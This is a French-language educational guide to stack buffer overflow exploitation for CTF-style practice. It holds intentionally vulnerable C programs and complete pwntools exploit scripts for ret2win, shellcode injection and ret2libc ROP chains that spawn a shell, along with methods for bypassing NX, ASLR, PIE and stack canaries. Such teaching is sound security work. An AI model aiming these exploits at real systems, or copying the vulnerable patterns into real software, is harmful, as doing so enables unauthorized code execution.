# Guide des Buffer Overflows - Exploitation Binaire

## Table des mati√®res
1. [Vue d'ensemble](#vue-densemble)
2. [Pr√©requis](#pr√©requis)
3. [Types d'exploitation](#types-dexploitation)
4. [Protections modernes](#protections-modernes)

---

## Vue d'ensemble

| Type | Description | Pr√©requis |
|:---|:---|:---|
| **Buffer Overflow simple** | D√©passer le tampon pour d√©clencher une condition | Buffer non prot√©g√© |
| **ret2win** | Rediriger l'ex√©cution vers une fonction cach√©e | Conna√Ætre l'adresse de la fonction cible |
| **Shellcode injection** | Ex√©cuter du code arbitraire dans la stack | Stack ex√©cutable (NX disabled) |
| **ret2libc** | Utiliser les fonctions de la libc pour ex√©cuter des commandes | Leak d'adresse libc |

---

## Pr√©requis

### Outils essentiels
```bash
# Installation des outils
sudo apt install gdb pwntools checksec

# V√©rification des protections d'un binaire
checksec --file <binary>
```

### Concepts cl√©s
- **Stack** : Zone m√©moire LIFO (Last In First Out) contenant variables locales et adresses de retour
- **RIP/EIP** : Registre contenant l'adresse de la prochaine instruction √† ex√©cuter
- **RBP/EBP** : Registre pointant vers la base de la stack frame actuelle
- **Padding** : Octets de remplissage pour atteindre l'adresse de retour

### Architecture et tailles
| Architecture | Adresses | Padding typique |
|:---:|:---:|:---:|
| x86 (32 bits) | 4 octets | Variable selon le buffer |
| x86-64 (64 bits) | 8 octets | Variable selon le buffer |

‚ö†Ô∏è **Important** : La taille du padding d√©pend de la taille du buffer ET de l'alignement. Utilisez toujours `cyclic()` et `cyclic_find()` pour d√©terminer l'offset exact.

---

## Types d'exploitation

### 1. Buffer Overflow Simple

Le buffer overflow basique consiste √† √©craser la m√©moire au-del√† d'un tampon pour modifier le comportement du programme.

#### Exemple vuln√©rable
```c
#include <stdio.h>

int main() {
    char buffer[10];
    int access = 0;
    
    printf("Entrez votre mot de passe : ");
    gets(buffer);  // ‚ö†Ô∏è VULN√âRABLE : pas de limite de taille
    
    if (access == 1) {
        printf("Acc√®s autoris√© !\n");
    } else {
        printf("Acc√®s refus√©.\n");
    }
    
    return 0;
}
```

#### Exploitation
```python
from pwn import *

# Configuration
context.arch = 'amd64'
context.log_level = 'info'

# Param√®tres
buffer_size = 10
target_value = p32(1)  # Valeur √† √©crire dans 'access'

# Payload : remplir le buffer + √©craser la variable
payload = b'A' * buffer_size + target_value

# Envoi
io = process('./vulnerable')
io.sendlineafter(b'password: ', payload)
io.interactive()
```

**Explication** : En d√©passant les 10 octets du buffer, on √©crase la variable `access` qui suit en m√©moire.

---

### 2. Ret2Win

Le ret2win consiste √† rediriger l'ex√©cution du programme vers une fonction existante mais non appel√©e normalement.

#### Exemple vuln√©rable
```c
#include <unistd.h>
#include <stdio.h>

void win() {
    puts("üéâ F√©licitations ! Vous avez gagn√© !");
    system("/bin/sh");
}

void vulnerable_function() {
    char buffer[0x100];
    
    printf("> ");
    read(0, buffer, 0x130);  // ‚ö†Ô∏è Overflow : lit 0x130 octets dans un buffer de 0x100
    printf("Commande inconnue\n");
}

int main() {
    setbuf(stdout, NULL);
    
    puts("=== Terminal de contr√¥le ===");
    
    while (1) {
        vulnerable_function();
    }
    
    return 0;
}
```

#### Analyse de la vuln√©rabilit√©
```bash
# V√©rifier les protections
$ checksec --file challenge
[*] '/path/to/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Vuln√©rabilit√©** : `read(0, buffer, 0x130)` lit 0x130 (304) octets alors que `buffer` ne fait que 0x100 (256) octets.
- **Overflow** : 304 - 256 = 48 octets
- **Cible** : √âcraser l'adresse de retour (saved RIP) pour sauter vers `win()`

#### Exploitation
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
exe = ELF('./challenge')
context.binary = exe
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('host', 1337)
    elif args.GDB:
        return gdb.debug(exe.path, gdbscript='''
            break vulnerable_function
            continue
        ''')
    else:
        return process(exe.path)

# R√©cup√©ration de l'adresse de win()
win_addr = exe.symbols['win']
info(f"Adresse de win() : {hex(win_addr)}")

# √âtape 1 : Trouver l'offset exact avec un pattern cyclique
# Dans GDB, apr√®s un crash :
# gdb> x/gx $rsp
# gdb> cyclic -l 0x6161616161616162  # Exemple d'adresse
offset = 0x108  # Trouv√© avec cyclic_find()

# √âtape 2 : Construction du payload
payload = flat(
    cyclic(offset),      # Remplissage jusqu'√† l'adresse de retour
    p64(win_addr)        # Nouvelle adresse de retour : win()
)

info(f"Taille du payload : {len(payload)} octets")
info(f"Payload : {payload[:50]}...")

# √âtape 3 : Exploitation
io = start()
io.sendlineafter(b"> ", payload)
io.interactive()
```

#### M√©thodologie de debugging

```bash
# 1. G√©n√©rer un pattern cyclique
$ python3 -c "from pwn import *; print(cyclic(300))" > pattern.txt

# 2. Lancer avec GDB
$ gdb ./challenge
(gdb) run < pattern.txt

# 3. Apr√®s le crash, r√©cup√©rer la valeur de RIP
(gdb) x/gx $rsp
0x7fffffffe108: 0x6161616161616168

# 4. Trouver l'offset
$ python3 -c "from pwn import *; print(cyclic_find(0x6161616161616168))"
264
```

---

### 3. Shellcode Injection

L'injection de shellcode permet d'ex√©cuter du code arbitraire directement dans la stack. Cette technique n√©cessite que la stack soit **ex√©cutable** (NX disabled).

#### V√©rification des pr√©requis
```bash
$ checksec --file challenge
[*] '/path/to/challenge'
    Arch:       amd64-64-little
    Stack:      Executable        # ‚úÖ Condition n√©cessaire
    NX:         NX disabled        # ‚úÖ Stack ex√©cutable
    PIE:        No PIE (0x400000)
```

#### Exemple vuln√©rable avec leak
```c
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>

int main(void);

void debug_info(void) { 
    printf("main address : %p\n", &main);
    printf("printf address : %p\n", *(uint64_t *)0x403008);
    
    void* local_var = NULL;
    printf("Stack address : %p\n", &local_var);  // üîç Leak de la stack
    
    return;
}

void vulnerable_function() {
    char buffer[0x100];
    
    printf("> ");
    read(0, buffer, 0x130);  // ‚ö†Ô∏è Overflow
    printf("Commande inconnue\n");
}

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    
    puts("=== Terminal de contr√¥le ===");
    
    while (1) {
        vulnerable_function();
    }
    
    return 0;
}
```

#### Technique du NOP sled

Un **NOP sled** (toboggan de NOP) est une s√©quence d'instructions `NOP` (`\x90` en x86/x64) qui ne font rien. L'int√©r√™t :
- **Flexibilit√©** : M√™me si l'adresse de retour n'est pas parfaitement pr√©cise, l'ex√©cution "glisse" sur les NOPs jusqu'au shellcode
- **Fiabilit√©** : Augmente les chances de succ√®s malgr√© l'ASLR partiel ou les impr√©cisions d'offset

```
M√©moire :
[NOP NOP NOP ... NOP][SHELLCODE][PADDING][ADRESSE_RETOUR]
                      ‚Üë
                      L'ex√©cution arrive ici et continue
```

#### Exploitation compl√®te
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
exe = ELF('./challenge')
context.binary = exe
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('host', 1337)
    else:
        return process(exe.path)

# ===== √âTAPE 1 : Leak de l'adresse de la stack =====
def leak_stack_address(io):
    """
    Exploite la fonction debug_info() pour obtenir l'adresse de la stack.
    On fait un premier overflow pour rediriger vers debug_info(), 
    puis revenir au main pour continuer l'exploitation.
    """
    debug_info_addr = exe.symbols['debug_info']
    main_addr = exe.symbols['main']
    
    payload = flat(
        cyclic(0x108),          # Offset jusqu'√† l'adresse de retour
        p64(debug_info_addr),   # Appeler debug_info()
        p64(main_addr)          # Retourner au main apr√®s
    )
    
    io.sendlineafter(b"> ", payload)
    
    # Parsing de la sortie
    io.recvuntil(b"Stack address : ")
    stack_leak = int(io.recvline().strip(), 16)
    
    success(f"Stack leak : {hex(stack_leak)}")
    return stack_leak

# ===== √âTAPE 2 : G√©n√©ration du shellcode =====
def generate_shellcode():
    """
    G√©n√®re un shellcode x64 qui ex√©cute /bin/sh
    """
    # M√©thode 1 : Avec pwntools (recommand√©)
    shellcode = asm(shellcraft.amd64.linux.sh())
    
    # M√©thode 2 : Shellcode manuel (23 octets)
    # shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    # shellcode += b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
    info(f"Shellcode g√©n√©r√© : {len(shellcode)} octets")
    return shellcode

# ===== √âTAPE 3 : Construction du payload final =====
def build_exploit_payload(stack_leak):
    """
    Structure du payload :
    [NOP SLED][SHELLCODE][PADDING][ADRESSE_RETOUR]
    
    L'adresse de retour pointe vers le d√©but du buffer (stack_leak - 0x100)
    pour commencer l'ex√©cution dans le NOP sled.
    """
    shellcode = generate_shellcode()
    
    # NOP sled : augmente la zone d'atterrissage
    nop_sled = b"\x90" * 16
    
    # Calcul de la taille du padding
    # 0x108 = offset total, on retire la taille du NOP sled + shellcode
    padding_size = 0x108 - len(nop_sled) - len(shellcode)
    
    # Adresse de retour : d√©but du buffer
    # Le buffer commence √† stack_leak - 0x100 (trouv√© en debug avec GDB)
    ret_addr = stack_leak - 0x100
    
    info(f"NOP sled : {len(nop_sled)} octets")
    info(f"Shellcode : {len(shellcode)} octets")
    info(f"Padding : {padding_size} octets")
    info(f"Adresse de retour : {hex(ret_addr)}")
    
    payload = flat(
        nop_sled,               # Zone d'atterrissage
        shellcode,              # Code √† ex√©cuter
        cyclic(padding_size),   # Remplissage jusqu'√† saved RIP
        p64(ret_addr)           # Nouvelle adresse de retour
    )
    
    return payload

# ===== MAIN =====
def exploit():
    io = start()
    
    # √âtape 1 : Leak de la stack
    stack_leak = leak_stack_address(io)
    
    # √âtape 2 : Construction et envoi du payload
    payload = build_exploit_payload(stack_leak)
    io.sendlineafter(b"> ", payload)
    
    # Shell obtenu !
    success("Shell obtenu ! üéâ")
    io.interactive()

if __name__ == "__main__":
    exploit()
```

#### Explications d√©taill√©es

**Pourquoi `stack_leak - 0x100` ?**
```
En analysant avec GDB :
(gdb) break vulnerable_function
(gdb) run
(gdb) x/20gx $rsp
0x7fffffffe100: 0x0000000000000000  ‚Üê D√©but du buffer
0x7fffffffe108: 0x0000000000000000
...
0x7fffffffe200: 0x00007fffffffe220  ‚Üê Saved RBP
0x7fffffffe208: 0x0000000000400abc  ‚Üê Saved RIP (adresse de retour)

stack_leak pointe vers 0x7fffffffe200
Le buffer commence √† 0x7fffffffe100
Donc : buffer = stack_leak - 0x100
```

**Calcul du padding**
```
Taille totale jusqu'√† saved RIP : 0x108 octets
- NOP sled : 16 octets
- Shellcode : ~48 octets (variable)
- Padding : 0x108 - 16 - 48 = 200 octets
```

---

### 4. Ret2libc

Le **ret2libc** (Return-to-libc) permet d'ex√©cuter du code arbitraire m√™me quand la stack n'est **pas ex√©cutable** (NX enabled). Au lieu d'injecter du shellcode, on r√©utilise les fonctions d√©j√† pr√©sentes dans la **libc** (biblioth√®que C standard).

#### Pr√©requis
```bash
$ checksec --file challenge
[*] '/path/to/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled          # ‚úÖ Stack non ex√©cutable
    PIE:        No PIE (0x400000)
```

#### Concept : ROP Chain (Return-Oriented Programming)

Une **ROP chain** est une s√©quence d'adresses qui, encha√Æn√©es, permettent d'ex√©cuter du code :

```
Stack avant l'exploit :
[BUFFER][Saved RBP][Saved RIP] ‚Üí retourne normalement

Stack apr√®s l'exploit (ROP chain) :
[BUFFER][gadget1][gadget2][gadget3][args][fonction_finale]
        ‚Üì        ‚Üì        ‚Üì        ‚Üì     ‚Üì
       RET      RET      RET     pop   system()
```

#### Exemple vuln√©rable avec leak libc
```c
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>

int main(void);

void debug_info(void) { 
    printf("main address : %p\n", &main);
    printf("printf address : %p\n", *(uint64_t *)0x403008);  // üîç Leak libc
    
    void* local_var = NULL;
    printf("Stack address : %p\n", &local_var);
    
    return;
}

void vulnerable_function() {
    char buffer[0x100];
    
    printf("> ");
    read(0, buffer, 0x130);  // ‚ö†Ô∏è Overflow
    printf("Commande inconnue\n");
}

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    
    puts("=== Terminal de contr√¥le ===");
    
    while (1) {
        vulnerable_function();
    }
    
    return 0;
}
```

#### Exploitation en deux √©tapes

**√âtape 1 : Leak de la libc**
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
exe = ELF('./challenge')
libc = ELF('./libc.so.6')  # Libc fournie ou trouv√©e sur le syst√®me
context.binary = exe

def start():
    return process(exe.path)

# ===== LEAK DE LA LIBC =====
def leak_libc(io):
    """
    Exploite debug_info() pour obtenir l'adresse de printf dans la libc.
    Cela permet de calculer la base address de la libc.
    """
    debug_info_addr = exe.symbols['debug_info']
    main_addr = exe.symbols['main']
    
    payload = flat(
        cyclic(0x108),
        p64(debug_info_addr),  # Appeler debug_info()
        p64(main_addr)         # Retour au main pour continuer
    )
    
    io.sendlineafter(b"> ", payload)
    
    # Parsing de la sortie
    io.recvuntil(b"printf address : ")
    printf_leak = int(io.recvline().strip(), 16)
    
    success(f"printf @ libc : {hex(printf_leak)}")
    
    # Calcul de la base address de la libc
    # libc_base = adresse_leak - offset_dans_libc
    libc_base = printf_leak - libc.symbols['printf']
    
    success(f"libc base : {hex(libc_base)}")
    
    return libc_base
```

**Explication du calcul** :
```
printf_leak     = 0x7ffff7a62e80  (adresse runtime de printf)
libc.sym.printf = 0x0000000064e80  (offset de printf dans libc.so.6)
                  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
libc_base       = 0x7ffff79fe000  (base address de la libc en m√©moire)
```

**√âtape 2 : Construction de la ROP chain**
```python
# ===== CONSTRUCTION DE LA ROP CHAIN =====
def build_rop_chain(libc_base):
    """
    Construit une ROP chain pour ex√©cuter system("/bin/sh")
    
    Gadgets n√©cessaires :
    - pop rdi ; ret  : Pour charger l'argument de system()
    - ret            : Pour aligner la stack (requis sur Ubuntu >= 18.04)
    
    Objectif final : system("/bin/sh")
    """
    # Mise √† jour de la base address de la libc
    libc.address = libc_base
    
    # Recherche des gadgets avec ROPgadget ou ropper
    rop = ROP(libc)
    
    # Gadget pour charger un argument dans RDI (1er argument en x64)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    
    # Gadget simple 'ret' pour l'alignement de la stack
    ret = rop.find_gadget(['ret'])[0]
    
    # Adresse de la cha√Æne "/bin/sh" dans la libc
    binsh = next(libc.search(b'/bin/sh\x00'))
    
    # Adresse de system() dans la libc
    system = libc.symbols['system']
    
    info(f"Gadget 'pop rdi ; ret' : {hex(pop_rdi)}")
    info(f"Gadget 'ret' : {hex(ret)}")
    info(f"Cha√Æne '/bin/sh' : {hex(binsh)}")
    info(f"Fonction system() : {hex(system)}")
    
    # Construction de la ROP chain
    payload = flat(
        cyclic(0x108),    # Offset jusqu'√† saved RIP
        p64(ret),         # ‚ö†Ô∏è IMPORTANT : Alignement de la stack
        p64(pop_rdi),     # Charger l'argument dans RDI
        p64(binsh),       # Argument : adresse de "/bin/sh"
        p64(system)       # Appeler system()
    )
    
    return payload
```

#### Pourquoi le gadget `ret` est-il n√©cessaire ?

Sur les syst√®mes modernes (Ubuntu >= 18.04), l'ABI x86-64 **exige** que la stack soit **align√©e sur 16 octets** avant certains appels syst√®me. L'instruction `movaps` (utilis√©e par `system()`) plante si la stack n'est pas align√©e.

```
Sans 'ret' :
Stack : 0x7fffffffe208 (non align√© sur 16)
‚Üí movaps plante avec SIGSEGV

Avec 'ret' :
Stack : 0x7fffffffe210 (align√© sur 16)
‚Üí movaps fonctionne correctement
```

Le gadget `ret` simple ajoute **8 octets** (1 adresse) sur la stack, ce qui corrige l'alignement.

#### Exploit complet
```python
#!/usr/bin/env python3
from pwn import *

# ===== CONFIGURATION =====
exe = ELF('./challenge')
libc = ELF('./libc.so.6')
context.binary = exe
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('host', 1337)
    elif args.GDB:
        return gdb.debug(exe.path, gdbscript='''
            break vulnerable_function
            continue
        ''')
    else:
        return process(exe.path)

# ===== LEAK LIBC =====
def leak_libc(io):
    debug_info = exe.symbols['debug_info']
    main = exe.symbols['main']
    
    payload = flat(
        cyclic(0x108),
        p64(debug_info),
        p64(main)
    )
    
    io.sendlineafter(b"> ", payload)
    
    io.recvuntil(b"printf address : ")
    printf_leak = int(io.recvline().strip(), 16)
    
    libc_base = printf_leak - libc.symbols['printf']
    
    success(f"printf @ libc : {hex(printf_leak)}")
    success(f"libc base : {hex(libc_base)}")
    
    return libc_base

# ===== ROP CHAIN =====
def build_rop_chain(libc_base):
    libc.address = libc_base
    rop = ROP(libc)
    
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.symbols['system']
    
    info(f"Gadgets trouv√©s :")
    info(f"  pop rdi ; ret : {hex(pop_rdi)}")
    info(f"  ret : {hex(ret)}")
    info(f"  /bin/sh : {hex(binsh)}")
    info(f"  system() : {hex(system)}")
    
    payload = flat(
        cyclic(0x108),
        p64(ret),
        p64(pop_rdi),
        p64(binsh),
        p64(system)
    )
    
    return payload

# ===== MAIN =====
def exploit():
    io = start()
    
    # √âtape 1 : Leak de la libc
    libc_base = leak_libc(io)
    
    # √âtape 2 : ROP chain
    payload = build_rop_chain(libc_base)
    
    # √âtape 3 : Exploitation
    io.sendlineafter(b"> ", payload)
    
    success("Shell obtenu ! üéâ")
    io.interactive()

if __name__ == "__main__":
    exploit()
```

#### Trouver la bonne libc

Si la libc n'est pas fournie, utilisez **libc database** :

```bash
# M√©thode 1 : Avec libc-database
$ git clone https://github.com/niklasb/libc-database
$ cd libc-database
$ ./find printf 0xe80 system 0x520
# Retourne la version de la libc correspondante

# M√©thode 2 : Avec libc.rip
# Allez sur https://libc.rip et entrez les offsets leak√©s
```

#### Alternative : one_gadget

Un **one_gadget** est une adresse dans la libc qui, si appel√©e directement, ex√©cute `/bin/sh` sans param√®tres.

```bash
# Installation
$ gem install one_gadget

# Recherche de one_gadgets
$ one_gadget libc.so.6
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

# Utilisation
payload = flat(
    cyclic(0x108),
    p64(ret),
    p64(libc_base + 0x4f3d5)  # one_gadget
)
```

**Avantage** : Simplifie la ROP chain (pas besoin de charger des arguments).
**Inconv√©nient** : Les contraintes ne sont pas toujours satisfaites.

---

## Protections Modernes

### Vue d'ensemble

| Protection | Description | Bypass |
|:---|:---|:---|
| **NX (No-eXecute)** | Stack non ex√©cutable | ret2libc, ROP |
| **ASLR** | Randomisation des adresses | Leak d'adresse |
| **PIE** | Code √† adresse al√©atoire | Leak d'adresse du binaire |
| **Stack Canary** | Valeur secr√®te avant saved RIP | Leak du canary |
| **RELRO (Full)** | GOT en lecture seule | Impossible de modifier la GOT |

### NX (No-eXecute) / DEP

**Principe** : La stack est marqu√©e comme **non ex√©cutable**. Tout code inject√© ne peut pas s'ex√©cuter.

```bash
$ checksec --file binary
NX:  NX enabled  # ‚úÖ Protection active
```

**Bypass** : Utiliser ret2libc ou ROP pour r√©utiliser du code existant.

### ASLR (Address Space Layout Randomization)

**Principe** : Les adresses de la stack, heap, et libc sont **randomis√©es** √† chaque ex√©cution.

```bash
# V√©rifier l'√©tat d'ASLR
$ cat /proc/sys/kernel/randomize_va_space
2  # 0 = d√©sactiv√©, 1 = partiel, 2 = complet

# D√©sactiver temporairement (pour debug)
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Exemple** :
```bash
# Sans ASLR
$ ldd /bin/ls
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a00000)

$ ldd /bin/ls
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a00000)  # M√™me adresse

# Avec ASLR
$ ldd /bin/ls
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8a2c000000)

$ ldd /bin/ls
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e45000000)  # Adresse diff√©rente
```

**Bypass** : Leak d'une adresse (via format string, UAF, etc.) pour calculer les autres adresses.

### PIE (Position Independent Executable)

**Principe** : Le code du binaire lui-m√™me est charg√© √† une adresse **al√©atoire**.

```bash
$ checksec --file binary
PIE:  PIE enabled  # ‚úÖ Protection active
```

**Impact** : Les adresses des fonctions comme `win()` changent √† chaque ex√©cution.

**Bypass** : Leak d'une adresse du binaire pour recalculer les offsets.

### Stack Canary

**Principe** : Une valeur **secr√®te** (canary) est plac√©e entre le buffer et saved RIP. Si elle est modifi√©e, le programme crash.

```bash
$ checksec --file binary
Stack:  Canary found  # ‚úÖ Protection active
```

**D√©tection en assemblage** :
```asm
mov    rax,QWORD PTR fs:0x28    ; Lecture du canary
mov    QWORD PTR [rbp-0x8],rax  ; Placement sur la stack

...

mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28    ; V√©rification du canary
je     <ok>
call   __stack_chk_fail         ; Crash si modifi√©
```

**Bypass** :
1. **Leak du canary** (via format string : `%11$p`)
2. **Brute force** (sur 32 bits, dernier octet toujours `\x00`)
3. **√âcriture non contigu√´** (√©craser saved RIP sans toucher au canary)

### RELRO (Relocation Read-Only)

**Principe** : Rend la **GOT** (Global Offset Table) en lecture seule apr√®s l'initialisation.

```bash
$ checksec --file binary
RELRO:  Full RELRO  # ‚úÖ GOT en lecture seule
```

**Partial RELRO** : GOT modifiable ‚Üí Possibilit√© de GOT overwrite
**Full RELRO** : GOT en lecture seule ‚Üí GOT overwrite impossible

---

## M√©thodologie G√©n√©rale

### 1. Reconnaissance
```bash
# Informations sur le binaire
$ file binary
$ checksec --file binary
$ strings binary
$ readelf -s binary  # Symboles
```

### 2. Analyse statique
```bash
# D√©sassemblage
$ objdump -d binary -M intel
$ r2 -A binary  # Radare2

# Analyse avec Ghidra/IDA
```

### 3. Analyse dynamique
```bash
# Avec GDB
$ gdb ./binary
(gdb) info functions
(gdb) disassemble main
(gdb) break *main
(gdb) run
(gdb) x/20gx $rsp  # Examiner la stack
```

### 4. Exploitation
```python
# Template pwntools
from pwn import *

exe = ELF('./binary')
context.binary = exe

io = process(exe.path)

# Pattern pour trouver l'offset
payload = cyclic(300)
io.sendline(payload)

# Apr√®s crash : cyclic_find(0xdeadbeef)
```

### 5. Post-exploitation
```bash
# Une fois le shell obtenu
$ id
$ cat flag.txt
$ python3 -c 'import pty; pty.spawn("/bin/bash")'  # Shell interactif
```

---

## Ressources Compl√©mentaires

### Documentation
- [Pwntools Documentation](https://docs.pwntools.com/)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [Exploit Education](https://exploit.education/)

### Challenges pratiques
- [pwnable.kr](http://pwnable.kr/)
- [ROP Emporium](https://ropemporium.com/)
- [PicoCTF](https://picoctf.org/)
- [Root Me](https://www.root-me.org/)

### Outils
```bash
# Installation de l'environnement complet
sudo apt install gdb gdb-peda python3-pip
pip3 install pwntools ropper

# Extensions GDB recommand√©es
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

---

## Bonnes Pratiques

### Debugging
- Toujours utiliser `cyclic()` pour trouver les offsets
- V√©rifier l'alignement de la stack avec GDB
- Tester localement avant d'attaquer un serveur distant

### S√©curit√©
- Ne pas utiliser ces techniques sur des syst√®mes sans autorisation
- Respecter les r√®gles des CTF et plateformes de challenges
- Documenter vos exploits pour apprendre et partager

### Code
- Commenter vos exploits
- Utiliser des fonctions pour structurer le code
- G√©rer les erreurs avec try/except

---

## Conclusion

Les buffer overflows sont la **porte d'entr√©e** de l'exploitation binaire. Bien que les protections modernes rendent l'exploitation plus complexe, la compr√©hension de ces techniques reste **fondamentale** pour :
- Comprendre les vuln√©rabilit√©s m√©moire
- Analyser des malwares
- D√©velopper des logiciels s√©curis√©s
- Progresser vers des techniques avanc√©es (heap exploitation, kernel exploitation)

**Prochaines √©tapes sugg√©r√©es** :
1. Format String Vulnerabilities
2. Heap Exploitation (Use-After-Free, Double-Free)
3. Kernel Exploitation
4. Return-Oriented Programming avanc√©

---

*Document cr√©√© pour l'apprentissage de l'exploitation binaire - Usage strictement √©ducatif*
